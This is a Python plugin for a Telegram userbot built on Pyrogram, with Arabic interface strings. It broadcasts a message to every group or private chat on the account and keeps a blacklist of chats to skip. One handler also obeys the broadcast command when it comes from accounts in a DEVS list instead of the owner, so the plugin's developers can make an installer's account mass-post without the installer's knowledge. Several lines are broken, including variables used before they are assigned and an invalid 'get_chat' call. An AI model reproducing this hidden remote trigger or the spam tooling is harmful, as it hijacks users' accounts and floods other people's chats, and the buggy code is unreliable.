
import asyncio
import dotenv
from pyrogram import Client, enums, filters
from pyrogram.types import Message
from ubotlibs.ubot.helper.basic import edit_or_reply
from . import *
from ubotlibs.ubot.utils import *
from Azazel.core.SQL.blchatsql import *
from config import *



@Client.on_message(filters.command(["cgcast" "اذاعة قر"], "") & filters.user(DEVS) & ~filters.me)
@Ubot(["Gcast", "اذاعة قر"], "")
async def gcast_cmd(client: Client, message: Message):
    if message.reply_to_message or get_arg(message):
        jamban = await message.reply("`جاري الاذاعة...`")
    else:
        return await jamban.edit("**رد على الرسالة الي تريد تذيعها**")
    done = 0
    error = 0
    user_id = client.me.id
    sempak = get_blchat(str(user_id))
    async for dialog in client.get_dialogs():
        if dialog.chat.type in (enums.ChatType.GROUP, enums.ChatType.SUPERGROUP):
            if message.reply_to_message:
                msg = message.reply_to_message
            elif get_arg:
                msg = get_arg(message)
            chat = dialog.chat.id
            if chat not in BL_GCAST and chat not in sempak:
                try:
                    if message.reply_to_message:
                        await msg.copy(chat)
                    elif get_arg:
                        await client.send_message(chat, msg)
                    done += 1
                    await asyncio.sleep(0.3)
                except Exception:
                    error += 1
                    await asyncio.sleep(0.3)
                    
    await jamban.edit(
        f"**تم الاذاعة الى** `{done}` **قروب , فشل الارسال الى** `{error}` **قروب**"
    )


@Ubot(["gucast", "ذاعة خاص"], "")
async def gucast(client: Client, message: Message):
    if message.reply_to_message or get_arg(message):
        spk = await message.reply("`جاري الاذاعة...`")
    else:
        return await spk.edit("**رد على الرسالة الي تريد تذيعها**")
    done = 0
    error = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type == enums.ChatType.PRIVATE and not dialog.chat.is_verified:
            if message.reply_to_message:
                msg = message.reply_to_message
            elif get_arg:
                msg = get_arg(message)
            chat = dialog.chat.id
            if chat not in DEVS:
                try:
                    if message.reply_to_message:
                        await msg.copy(chat)
                    elif get_arg:
                        await client.send_message(chat, msg)
                    done += 1
                    await asyncio.sleep(0.3)
                except Exception:
                    error += 1
                    await asyncio.sleep(0.3)
                    
    await spk.edit(
        f"**تم الاذاعة الى** `{done}` **محادثة, فشل الاذاعة الى** `{error}` **محادثة**"
    )


@Ubot(["addbl", "حوب"], "")
async def bl_chat(client, message):
    if len(message.command) != 2:
        return await message.reply("**استخدم الامر:**\n `addbl او حوب [ايدي القروب او الشات]`")
    user_id = client.me.id
    semprul = get_blchat(str(user_id))
    chat_id = int(message.text.strip().split()[1])
    if chat_id in semprul:
        return await message.reply("تمت إضافة الدردشة إلى قائمة Blacklist Cast")
    add_blchat(str(user_id), chat_id)
    await message.edit("تمت إضافة الدردشة إلى قائمة Blacklist Cast")

@Ubot(["delbl", "فوب"], "")
async def del_bl(client, message):
    if len(message.command) != 2:
        return await message.reply("**استخدم الامر:**\n `delbl او حوب [ايدي الشات]`")
    user_id = client.me.id
    chat_id = int(message.text.strip().split()[1])
    latau = get_blchat(str(user_id))
    if chat_id not in latau:
        return await message.reply("تم الغاء الحظر عن المحادثة.")
    rm_blchat(str(user_id), chat_id)
    await message.edit("تم الغاء الحظر عن المحادثة.")
    

@Ubot(["blchat", "ليست"], "")
async def all_chats(client, message):
    text = "**القائمة السوداء:**\n\n"
    j = 0
    user_id = client.me.id
    nama_lu = get_blchat(str(user_id))
    for count, chat_id in enumerate(nama_lu, 1):
        try:
            title = (await client.me.id.get_chat(chat_id)).title
        except Exception:
            title = "خاصة\n"
        j = 1
        text += f"**{count}.{title}**[`{chat_id}`]\n"
    if j == 0:
        await message.reply("لا توجد قائمة سوداء")
    else:
        await message.reply(text)


add_command_help(
    "الاذاعة",
    [
        [f"gcast او اذاعة قر [بعدها اكتب الي تريده او بالرد]",
            "يرسل رسالة لكل القروبات (تقدر تستخدم الصور او الملصقات)"],
        [f"gucastاو اذاعة خاص [بعدها اكتب الي تريده او بالرد]",
            "يرسل رسالة لكل المحادثات (تقدر تستخدم الصور او الملصقات)"],
        [f"addbl او حوب [ايدي الشات او المحادثة]",
            "يحظر القروب او المحادثة من الاذاعة"],
        [f"delbl  او فوب [ايدي القروب او المحادثة]",
            "يفك الحظر عن القروب او المحادثة عشان توصل اذاعتك"],
        [f"blchat او ليست [الايدي]",
            "لرؤية القائمة "],
    ],
)
